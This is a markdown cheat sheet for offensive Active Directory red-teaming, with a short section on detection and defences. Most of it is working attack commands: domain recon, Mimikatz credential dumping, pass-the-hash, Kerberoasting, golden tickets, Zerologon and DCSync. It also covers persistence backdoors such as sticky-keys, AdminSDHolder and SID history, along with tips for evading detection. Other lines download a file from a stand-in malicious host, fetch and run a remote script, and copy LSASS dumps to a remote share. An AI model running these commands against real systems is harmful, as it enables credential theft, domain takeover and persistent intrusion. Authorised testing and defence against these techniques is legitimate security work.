# Offensive Active Directory 
## Summary
This document is designed to be a used in a red team assesment and contains commands, tools and methods with which anyone can attack and defend active directory. 


- [Tools](#tools)
- [Domain Recon](#domain-recon)
  - [To Query Active Directory](#to-query-active-directory)
  - [Domain Enumeration](#domain-enumeration)
  - [Domain Recon](#domain-recon-1)
      - [Enumerate usernames](#enumerate-usernames)
      - [enum4linux](#enum4linux)
      - [Extract machine usernames (user\$) from above](#extract-machine-usernames-user-from-above)
      - [Masscan all "user\$.domain\_name" for open ports](#masscan-all-userdomain_name-for-open-ports)
      - [Nmap all "user\$.domain\_name" for open ports](#nmap-all-userdomain_name-for-open-ports)
  - [Get Default Domain Policies](#get-default-domain-policies)
  - [Find Domain Controllers](#find-domain-controllers)
- [Trust Enumeration](#trust-enumeration)
- [User Recon](#user-recon)
- [Computer Recon](#computer-recon)
- [Groups Recon](#groups-recon)
- [Memership Recon](#memership-recon)
- [Group Policy Recon](#group-policy-recon)
  - [Check policy from the server itself](#check-policy-from-the-server-itself)
- [OU Recon](#ou-recon)
- [Special Target Recon](#special-target-recon)
  - [Remote Registry and Local Administrator rights - PowerView](#remote-registry-and-local-administrator-rights---powerview)
  - [Find Servers with Shares](#find-servers-with-shares)
  - [Get High-Value Target where multiple people login like file server](#get-high-value-target-where-multiple-people-login-like-file-server)
  - [User Hunting](#user-hunting)
  - [This invokes Get-NetComputer and uses Invoke-CheckLocalAdminAccess](#this-invokes-get-netcomputer-and-uses-invoke-checklocaladminaccess)
  - [This Looks for Domain Admin Sessions - Short Path](#this-looks-for-domain-admin-sessions---short-path)
- [Domain ACL Enumeration](#domain-acl-enumeration)
  - [SQL Server Recon](#sql-server-recon)
- [Exploitation](#exploitation)
  - [PowerShell basics](#powershell-basics)
  - [Enable PS Remoting](#enable-ps-remoting)
  - [Privilege Escalation - Local Admin](#privilege-escalation---local-admin)
  - [Reigstry Backdoors](#reigstry-backdoors)
  - [Memory dump LOLBAS](#memory-dump-lolbas)
  - [Download a Program](#download-a-program)
  - [Query Sessions](#query-sessions)
  - [View passwords in cleartext](#view-passwords-in-cleartext)
  - [RDP without password](#rdp-without-password)
  - [Gain foothold](#gain-foothold)
  - [ASEPRoast](#aseproast)
  - [Unconstrained Delegation](#unconstrained-delegation)
  - [msDS-AllowedToDelegateTo](#msds-allowedtodelegateto)
  - [Trusts](#trusts)
    - [Forest to Forest](#forest-to-forest)
  - [Mimikatz](#mimikatz)
    - [Remove protections such as PPL and bypass Credential Guard](#remove-protections-such-as-ppl-and-bypass-credential-guard)
  - [Priv Escalation - AD](#priv-escalation---ad)
  - [HeidiSQL Portable](#heidisql-portable)
- [Persistence](#persistence)
  - [Golden Ticket](#golden-ticket)
  - [WMI](#wmi)
  - [AdminSDHolder](#adminsdholder)
  - [SID History](#sid-history)
  - [Enable DSRM Admin Login](#enable-dsrm-admin-login)
- [ACE Format](#ace-format)
- [Protection](#protection)
  - [Golden Ticket](#golden-ticket-1)
  - [Silver Ticket](#silver-ticket)
  - [Skeleton Key](#skeleton-key)
  - [DSRM Admin Logon Detection](#dsrm-admin-logon-detection)
  - [Kerberoasting](#kerberoasting)
  - [Delegation defenses](#delegation-defenses)
  - [ACL Attacks](#acl-attacks)
  - [SIDFiltering](#sidfiltering)
  - [ATA](#ata)
  - [LAPS](#laps)
  - [Credential Guard](#credential-guard)
  - [Protected Users Group](#protected-users-group)
  - [Privileged Administrative Worksatations (PAWs)](#privileged-administrative-worksatations-paws)
    - [GPO Protection](#gpo-protection)
  - [AD Security Model](#ad-security-model)
      - [Control Restrictions - What admins control](#control-restrictions---what-admins-control)
      - [Logon Restrictions - Where admins can log-on to](#logon-restrictions---where-admins-can-log-on-to)
      - [Enhanced Security Admin Environment](#enhanced-security-admin-environment)
  - [Forest - a security boundary](#forest---a-security-boundary)
  - [PowerShell version 5](#powershell-version-5)
- [Deception](#deception)
    - [Things to watch out to make deception real](#things-to-watch-out-to-make-deception-real)
- [References](#references)
      - [Wiki](#wiki)
      - [DCShadow](#dcshadow)
      - [BloodHound](#bloodhound)
      - [CrackMapExec](#crackmapexec)
      - [EmPyre](#empyre)
      - [Red Teaming AD (PDF)](#red-teaming-ad-pdf)
      - [Attack Methods - Domain Admin](#attack-methods---domain-admin)
      - [Attacking Domain Trusts](#attacking-domain-trusts)
      - [Misc Tools/Scripts](#misc-toolsscripts)
    - [Attack Kerberos](#attack-kerberos)
      - [Protocol Info](#protocol-info)
      - [Attacking Kerberos](#attacking-kerberos)
      - [Attack Kerberos w/o Mimikatz](#attack-kerberos-wo-mimikatz)
      - [Roasting AS-REPS](#roasting-as-reps)
      - [Kerberos Party Tricks](#kerberos-party-tricks)
    - [Persistence](#persistence-1)
      - [AD Persistence](#ad-persistence)
    - [LLMNR/NetBios-NS spoofing](#llmnrnetbios-ns-spoofing)
      - [Responder](#responder)
      - [Metasploit](#metasploit)
    - [GPO](#gpo)
      - [CPasswords](#cpasswords)
      - [Detailed Group Policy Information](#detailed-group-policy-information)
    - [Privilege Escalation](#privilege-escalation)
      - [Windows](#windows)

# Tools
- [ADModule - Nikhil Mittal](https://github.com/samratashok/ADModule)
- [ADModule Microsoft Reference](https://docs.microsoft.com/en-us/powershell/module/addsadministration/)
- To audit GPO, use [Grouper2](https://github.com/l0ss/Grouper2)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
- [PingCastle](https://github.com/vletoux/pingcastle)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [AD Recon](https://github.com/adrecon/ADRecon)
- [AD Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
- [NetCease](https://github.com/p0w3rsh3ll/NetCease)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [Kerbrute](https://github.com/ropnop/kerbrute)
- [Bloodhound](https://github.com/BloodHoundAD/BloodHound)

# Domain Recon

## To Query Active Directory

- [ADSI]
- System.DirectoryServices.ActiveDirectory 
- Powershell AD Module
- PowerView
	- When using PowerView beware of AVs / EDR you can use SharpView or modify it for own use.
- Bloodhound 
	- These days many environments have deception solutions / Microsoft ATA or similar software that detect bloodhoound data collection. Be careful when you use this.


## Domain Enumeration
- Gets you the domain name
```
$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
$ADClass::GetCurrentDomain()
```

## Domain Recon
- Gets you the domain information
- ADModule
```
Get-ADDomain
Get-ADDomain -Identity security.local
(Get-ADDomain).DomainSID
```
#### Enumerate usernames

- https://github.com/skorov/ridrelay

#### enum4linux

- https://highon.coffee/blog/enum4linux-cheat-sheet/

#### Extract machine usernames (user\$) from above

#### Masscan all "user\$.domain\_name" for open ports
```
masscan --rate 100000 -e eth0 --ports&lt;port range&gt; --open-only &lt;SCAN RANGE&gt;
```
- Common ports: 21, 22, 23, 25, 53, 80, 443, 445, 3389, etc

- Reference: https://github.com/robertdavidgraham/masscan

#### Nmap all "user\$.domain\_name" for open ports

- Nmap all "user\$.domain\_name" for open ports/services

- Tuned Nmap

    ```
    nmap -Pn -n -A -T4 --top-ports=1000 --max-rtt-timeouts=500ms --initial-rtt-timeout=200ms --min-rtt-timeout=2--ms --open --stats-every 5s &lt;IP/Range&gt;
    ```

## Get Default Domain Policies
- Gets you the domain policies related to kerberos 
- PowerView
```
Get-DomainPolicy
(Get-DomainPolicy)."System Access"
(Get-DomainPolicy)."Kerberos Policy"
```

## Find Domain Controllers
- Gets the Domain Controller you are connected to
- AD Module
```
Get-ADDomainController
``` 
# Trust Enumeration
- Powerview
```
Get-NetDomainTrust
Get-NetDomainTrust -Domain security.local
Get-NetForestTrust
```
- AD Module
```
Get-ADForest
Get-ADForest -Identity security.local
(Get-ADForest).Domains
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
```
# User Recon
- AD Module
```
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity domainAdmin -Properties *
Get-ADUser -Server DC.security.local
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberName *Properties | select name
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
``` 

- Look at logoncount, badpwdcount, pwdlastset find real users and dodge fake and decoy users.
- AD Module
```
Get-ADUser -Filter 'If you have a filter' -Properties Description | select name,Description | Export-CSV "Description.csv"
```
- This will generate a 4662, which you can look for with the command
```
(Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4662} | 
Select-Object -Property Category,Index,TimeGenerated,
EntryType,Source,InstanceID,Message) -match "domainAdminn" | Format-Table -AutoSize
```

# Computer Recon
- AD Module
```
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter * | select name
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
```

# Groups Recon
- AD Module
```
Get-ADGroup -Filter * | select name 
Get-ADGroup -Filter * -Properties *
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
Get-ADGroupMember -Identity 'Administrators' -Recursive -Server <> | % {Get-ADUser $_ -prop ServicePrincipalName} | Where {$_.ServicePrincipalName}
```
- Key Admins and Enterprise Key Admins introduced from Windows Server 2016

# Memership Recon

- Look for IsGroup - Groupception i.e. where groups are a part of groups.
- Built-in admins renaming is useless as it will have 500 as SID ending. Use this technique if you can't find the built-in administratrator by name.
- Recursive gets the details of sub existing groups as well
- AD Module

```
Get-ADGroupMember -Identity "Domain Admins" -Recursive
Get-ADPrincipalGroupMembership -Identity domainAdmin
```
- Powersploit
```
Get-NetGroupMember -GroupName '*Admin' -Domain security.local | Select-Object MemberName
```

- Filter based script
```
$Groups = Get-ADGroup -Filter * -SearchBase "OU=confidential,DC=security,DC=local"
$Members = foreach ($Group in $Groups)
{
    Get-ADGroupMember -Identity $Group |
    Where-Object objectClass -eq 'Group' |
    Select-Object Name,SamAccountName
}
Write-Output $Members
```
# Group Policy Recon

- AD Module
```
Get-GPO -All
Get-GPResultatnSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html
```
- PowerView
```
Get-NetGPO | select dispalyname
Get-NetGPO -ComputerName <>
Get-NetGPOGroup
```
## Check policy from the server itself
```
gpresult /R /V
Find-GPOComputerAdmin -Computername <>
Find-GPOLocation -UserName domainAdmin -Verbose
```
# OU Recon

- PowerView
```
Get-NetOU -FullData
Get-NetOU -GPOname "{GUID}"
```

- AD Module
```
Get-ADOrganizatioalUnit -Filter * -Properties *
Get-GPO -Guid {GUID}
```

# Special Target Recon

## Remote Registry and Local Administrator rights - PowerView
- PowerView

```
Get-NetLoggedon -ComputerName 
Get-LoggedonLocal -ComputerName 
Get-LastLoggedOn -ComputerName
```

## Find Servers with Shares
- PowerView

```
Invoke-ShareFinder -Verbose
Invoke-ShareFinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC
Invoke-FileFinder -Verbose
```

## Get High-Value Target where multiple people login like file server
- PowerView
```
Get-NetFileServer
```

## User Hunting
- PowerView
```
Find-LocalAdminAccess -Verbose
```
## This invokes Get-NetComputer and uses Invoke-CheckLocalAdminAccess
- PowerView

```
Find-WMILocalAdminAccess.ps1
Invoke-EnumerateLocalAdmin -Verbose
```

## This Looks for Domain Admin Sessions - Short Path
- PowerView
```
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
Invoke-UserHunter -CheckAccess
```

# Domain ACL Enumeration
```
Get-ObjectAcl -SamAccountName student1 -ResolveGUIDs
Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose
(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=security,DC=local').Access
Get-ObjectAcl -ADSpath "LDAP://" -ResolveGUIs -Verbose
Invoke-ACLScanner -ResolveGUIDs
Get-PathAcl -Path "\\security.local\sysvol"
```
## SQL Server Recon
```
Get-SQLInstanceDomain
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
Get-SQLServerLink
```

# Exploitation
## PowerShell basics
```
start powershell -credential ""
Enter-PSSession -ComputerName COMPUTER -Credential USER
Invoke-Command -ComputerName <> -ScriptBlock ${function:hello}
ls function:
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName <> 
Invoke-Mimikatz -DumpCreds -ComputerName
Exit-PSSession
```

## Enable PS Remoting

- wsmprovhost is executed on a client computer when running PSRemoting
- PSExec
```
\PsExec.exe \\Computer -u domain\user -s powershell Enable-PSRemoting -Force
Invoke-WmiMethod -ComputerName <> -Namespace root\cimv2 -Class Win32_Process -Name Create -Credential "domain\user" -Impersonation 3 -EnableAllPrivileges -ArgumentList "powershell Start-Process powershell -Verb runAs -ArgumentList 'Enable-PSRemoting –force'"
```
- WMI
```
Invoke-WmiMethod -ComputerName localmachine.security.local -Namespace root\cimv2 -Class Win32_Process -Name Create -Credential "security.local\domainAdmin" -Impersonation 3 -EnableAllPrivileges -ArgumentList "powershell Start-Process powershell -Verb runAs -ArgumentList 'Enable-PSRemoting –force'"
```
## Privilege Escalation - Local Admin
- PowerSploit
```
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
Get-ModifiableService -Verbose
```
- WMI
```
Get-WmiObject -Class win32_service | Where-Object {$_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne '')} | Where-Object { (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'"))} | Where-Object {($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf(".exe") + 4)) -match ".* .*"}
```

## Reigstry Backdoors
```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d “cmd” /f
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

## Memory dump LOLBAS
```
Rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\crash_dump.bin full
Copy-Item –Path C:\temp\crash_dump.bin –Destination '\\192.168.1.2\c$'
```

## Download a Program
```
$url = "https://myhost.malware/file.exe"
$output = "./file.exe"
Invoke-WebRequest -Uri $url -OutFile $output
```

## Query Sessions
```
query session
logoff ID
```

## View passwords in cleartext
- Powershell as Admin
```
New-ItemProperty "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1 -PropertyType "DWord"
```
- cmd as admin
``` 
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

## RDP without password 
- Enable Restricted Admin to RDP without password 
- Enable RestrictedAdmin to login with NTLM hash and mstsc.exe /RestrictedAdmin
- Use mimikatz to PTH / PTT and launch mstsc.exe /RestrictedAdmin after adding this key. 
```
REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

## Gain foothold 
- Reset password of users who have PASSWD_NOTREQD flag set and have never set a password.
- BONUS: if they are part of a group which have extended rights. You can also use this account to persist, just make sure this account is ancient.
```
Get-ADUser -Filter "useraccountcontrol -band 32" -Properties PasswordLastSet | Where-Object { $_.PasswordLastSet -eq $null } | select SamAccountName,Name,distinguishedname | Out-GridView 
```

## ASEPRoast
```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Add-Type -AssemblyName System.IndemtityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
Invoke-Mimikatz -Command '"kerberos::list /export"  
python tgsrepcrack.py wordlist.txt .kirbi
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth 
Set-DomainObject -Identity -XOR @{useraccountcontrol=4194304} -Verbose
Get-ASREPHash -UserName -Verbose
Invoke-ASREPRoast -Verbose
```

## Unconstrained Delegation
```
Get-NetComputer -UnConstrained
Get-NetUser -UnConstrained
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq True}
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
```

## msDS-AllowedToDelegateTo
```
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```
## Trusts

### Forest to Forest
- [Read this for more info](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
```
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
lsadump::trust /patch
kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi
.\asktgs.exe c:\temp\ticket.kirbi CIFS/DC.parent.local
.\Rubeus.exe asktgs /ticket:c:\ad\tools\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
dir \\machine.domain.local\c$
```
## Mimikatz

### Remove protections such as PPL and bypass Credential Guard
```
privilege::debug
!+
token::elevate
!processprotect /remove /process:LSASS.EXE
misc::memssp
```
- Dump passwords
```
Invoke-Mimikatz -Command "privilege::debug" "sekurlsa::logonpasswords full"
Invoke-Mimikatz -Command "privilege::debug" "sekurlsa::wdigest"
```
- MiniDump
```
privilege::debug
sekurlsa::minidump crash_dump.bin
sekurlsa::logonPasswords
```
- Pass the Hash
```
Invoke-Mimikatz -Command "privilege::debug" "sekurlsa::pth /user:Administrateur /domain:security.local /ntlm:xxxxxxxxxxxxx"
```
- Export Tickets
```
Invoke-Mimikatz -Command "privilege::debug" "sekurlsa::tickets /export"
```
- List Kerberos encryption keys
```
Invoke-Mimikatz -Command "privilege::debug" "sekurlsa::ekeys"
```
- Credential Manager & DPAPI
```
dir \\192.168.1.2\c$\Users\<username>\AppData\Local\Microsoft\Credentials\*
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\164451c5ed8ad780d136e400bd0c50c8
Invoke-Mimikatz -Command "privilege::debug" "sekurlsa::dpapi"
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\164451c5ed8ad780d136e400bd0c50c8 /masterkey:e605b19f96917ed2a29c816eb2f2cfdb85c9ba67379e62721b77b3ee0e23ec6e253ba6202a1595dc63083212d8933a11bc93fc85c5bac7f04406d5d5af2e57a3
```
- Vault 
```
vault::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Vault\"
```
- List Kerberos credentials for all authenticated users (including services and computer account)
```
Invoke-Mimikatz -Command "privilege::debug" "sekurlsa::kerberos"
```
- Dump all local credentials on a Windows computer
```
Invoke-Mimikatz -Command "token::elevate" "lsadump::sam"
```
- DCSync - Golden Ticket
```
mimikatz "lsadump::dcsync /domain:security.local /user:netbios\krbtgt"
.\mimikatz.exe kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
```
- Zerologon
```
lsadump::zerologon /server:DC.security.local /account:DC$
lsadump::zerologon /server:DC.security.local /account:DC$ /exploit
lsadump::dcsync /domain:security.local /dc:DC /user:krbtgt /authuser:DC$ /authdomain:security /authpassword:"" /authntlm
```

## Priv Escalation - AD
```
Rubues.exe monitor /interval:1 > tickets.txt
SpoolSample.exe target client
```

## HeidiSQL Portable
```
select * from openquery("dcorp-sql1",'select * from masters..sysservers ')
Get-SQLServerLinkCrawl -Instance <> -Verbose
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;')AT("eu-sql")
Get-SQLServerLinkCrawl -Instance <> -Query "exec master ..xp_cmdshell 'whoami'"
```

# Persistence
## Golden Ticket 
- Provide the new ID with ACLs to DCSync.
- Give yourself or the victim Replicate DC, Replicate All, Replicate In Filtered Set to DCSync.

```
Set-ADACL -DistinguishedName 'DC=SRV,DC=security,DC=local' -Principal domainAdmin -GUIDRight DCSync -Verbose
mimikatz "lsadump::dcsync /domain:security.local /user:netbios\krbtgt"
```
- krbtgt requires 2 reset to mitigate golden ticket
- Evade time based detection with renewmax
- Bypass the MaxTicketAge when creating a golden ticket and check for detection

```
kerberos::golden /admin:ADMIINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt

kerberos::golden /user:Administrator /domain:security.local /sid:S-1-5-21-123456789-1234567890-1111112345 /aes128:xxxxx id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

## WMI
- Add WMI Rights on a DC as persistence and execute code wheneever you want.
- Add you account to dcomcnfg WMI -> Component Services (COM Security) and Comp Management (WMI Control - root namespace)

## AdminSDHolder
- This privilege will not add the ID in the Domain Admin group, however allows the ID to modify the Domain Admins group.
- ADModule
```
Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=SRV,DC=security,DC=local' -Principal domainAdmin -Verbose
Add-ADGroupMember -Identity 'Domain Admins' -Members testda -Verbose
Add-ObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=security,DC=local' -PrincipalIdentity hacker -Verbose -Rights All
Get-ObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=security,DC=local' -Verbose 
```
- Invoke-ADSDPropagation
```
powershell.exe iex (iwr 'https://raw.githubusercontent.com/edemilliere/ADSI/master/Invoke-ADSDPropagation.ps1')
Invoke-ADSDPropagation
```

## SID History
- Modify the SIDHistory attribute of an ID to the SID of a privileged user.
- Allows the user to have high privileges without being a member of that group.
- Nice technique, however it is getting detected easily now.
- Check if domain / trust have SID Filtering enabled beforehand.
```
privilege::debug
token::elevate
sid::patch
sid::add /sam:"hacker" /new:S-1-5-21-123456789-1234567890-1111112345-519
```
## Enable DSRM Admin Login
- Use mimikatz to dump the DSRM Admin password.
- This hash is never changed by SysAdmins as this is a recovery account.
```
privilege::debug
lsadump::sam
```
- Copy the NTLM Hash
```
Domain : SECURITY
SysKey : 48e9dfa91da8e1b32a38b9e45323e430
Local SID : S-1-5-21-123456789-1234567890-1111112345

SAMKey : 2c9d7841c1ab3a64b7e0f8d5ee3ad828

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: af5adaaf26ccc3fab908fcb5435b49d8
```
- PowerShell
```
New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD
```
- cmd
```
REG ADD HKLM\System\CurrentControlSet\Control\Lsa\ /v DsrmAdminLogonBehavior /t REG_DWORD /d 1 /f
```
# ACE Format
- ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
- [RACEToolkit](https://github.com/samratashok/RACE)

# Protection

- Limit DAs login, if DA login is necessary donot allow other administrators to login to that machine.

- Never run service with a DA priv
Add-ADGroupMember -Identity 'Domain Admins' -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)  

## Golden Ticket

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon

```
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List -Property *
```

## Silver Ticket
- 4624: Account Logon
- 4634: Account Logoff
- No 4672 due to Silver Ticket

## Skeleton Key
- System 7045 - A service was installed in the system
- 4673 - Sensitive Privilege Use
- 4611 - logon process reg with LSA

```
New-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL -Value 1 -Verbose
```

## DSRM Admin Logon Detection
- 4657 - Audit creation/change of DSRMAdminLogonBehavior

## Kerberoasting
- 4769 : kerberos ticket was requested
- Managed Service Accounts - Automatic change of password perodically
- Service name should not be krbtgt
- Service name should end with $
- account name should not be machine@domain
- Failure code is '0x0'
- Encryption type should be 0x17

## Delegation defenses
- Account is sensitive and cannot be delegated for privileged accounts

## ACL Attacks
- 4662 - An operation was performed on an object
- 5136 - A directory service object was modified
- 4670 - Permissions on object were changed
- 4780 - The ACL was set on accounts which are members of administrators groups
- 4756 - Account was added to security-enabled universal group

- http://github.com/canix1/ADACLScanner

## SIDFiltering
- Enable SIDFiltering
- Selective Authentication

## ATA
- 4776
- Builds profile over time
- UEBA in 4 weeks for org
- Lightweight gateway on DCs

- Ignore Get-NetGroupMember and Get-NetComputer
- Use AES256 and AES128 to bypass Over Pass The Hash Detection and Golden Ticket Detection
- Envrypted PA-DATA PA-ENC-TIMESTAMP
- Create Ticket for non-existent user
- DCSync is not spoofable until ST is used
- DCShadow is not detected, which allows DCSync

## LAPS
- ms-mcs-AdmPwd
- ms-mcs-AdmPwdExpirationTime
- AdmPwd.dll
- Which users are allowed to view these LAPS 

## Credential Guard
- Blocks PTH and over PTH 
- SAM and LSA Secrets are not protected
- Cannot be enabled over a domain controller as it breaks authentication over there

## Protected Users Group
- Cannot use CredSSP and WDigest - clear text caching stop
- NTLM is not cached
- Kerberos doesnot use DES or RC4 keys
- If domain functional level is Sever 2012 R2 
    - No NTLM Auth
    - No DES or RC4 keys
    - No delegation 
    - No renewal of TGT
- MS to add DAs and EAs to this group without testing the impact of "lockout"

## Privileged Administrative Worksatations (PAWs)
- Deploy PAWs like solution if possible

### GPO Protection
- WMI Filtering
- Change machine policy for GPO to 'Domain Computers' and remove read for 'Authenticated Users' in GPO settings
- Add specific computers to GPO in filtering
- Attacker tip: write directly to SYSVOL to avoid GPO audit
- MS Pass the hash whitepaper

## AD Security Model
-   Tier 0 - Accounts, Groups and computers such as dc, da and ea
-   Tier 1 - Accounts, Groups and computers such as local admin on multiple servers with business value
-   Tier 2 - Administrative accounts such as help desk, support admin

#### Control Restrictions - What admins control
#### Logon Restrictions - Where admins can log-on to
#### Enhanced Security Admin Environment
## Forest - a security boundary
- Administrative Forest called Red Forest
- Selective Authentication in Red Forest

## PowerShell version 5 
- 4104 Suspicious (Script Block Logging)
- Module is highest, System wide Script is high
- PSAmsi-Mimimizing-Obfuscation-To-Maximize-Stealth

# Deception
- Password does not expire
- Trusted for Delegation
- Users with SPN
- Password in description
- High Privileged Users
- ACL rights over other users, groups or containers
- GenericRead for "Everyone"
- 4662 log - An operation was performed on an object
- x500uniqueIdentifier
- Older Operating Systems
- DCShadow for Deception - chances of auth failure
- Forest Admins
- Set Logon Workstation to a non-existent machine
- Deny logon to user
- 4768 Kerberos use
- Master user and Slave user
- Rights to GA - Slave user

### Things to watch out to make deception real
- objectSID
- lastLogon, lastlogotimestamp
- Logoncount
- whenCreated
- Badpwdcount
- Honeypot buster tracks 6 logons

# References

#### Wiki

- https://adsecurity.org/

#### DCShadow

- https://blog.alsid.eu/dcshadow-explained-4510f52fc19d

#### BloodHound

- [Automating](https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html)

- [NTLM Relaying](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

- [Automate BloodHound](https://github.com/mdsecactivebreach/ANGRYPUPPY)

- [Extending](https://speakerdeck.com/porterhau5/extending-bloodhound-for-red-teamers)

- [Guide](https://www.ernw.de/download/BloodHoundWorkshop/ERNW\_DogWhispererHandbook.pdf)

#### CrackMapExec

- [Intro](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html)

- [Use case](https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html)

#### EmPyre

- http://www.rvrsh3ll.net/blog/empyre/empyre-engaging-active-directory/

#### Red Teaming AD (PDF)

- https://adsecurity.org/wp-content/uploads/2016/08/DEFCON24-2016-Metcalf-BeyondTheMCSE-RedTeamingActiveDirectory.pdf

- https://adsecurity.org/wp-content/uploads/2018/05/2018-NolaCon-Metcalf-ActiveDirectorySecurityTheJourney.pdf

#### Attack Methods - Domain Admin

- https://adsecurity.org/?p=2362

#### Attacking Domain Trusts

- https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944

#### Misc Tools/Scripts

- [LOLBAS - Living Off The Land Binaries And Scripts](https://github.com/api0cradle/LOLBAS)

- https://github.com/0xdea/tactical-exploitation

### Attack Kerberos

#### Protocol Info 

- https://adsecurity.org/?p=227

#### Attacking Kerberos

- <http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html?m=1>

- <https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html>

- <https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html>

- <https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf>

#### Attack Kerberos w/o Mimikatz

- <http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/>

#### Roasting AS-REPS

- <http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/>

#### Kerberos Party Tricks

- <http://www.exumbraops.com/blog/2016/6/1/kerberos-party-tricks-weaponizing-kerberos-protocol-flaws>

### Persistence

#### AD Persistence

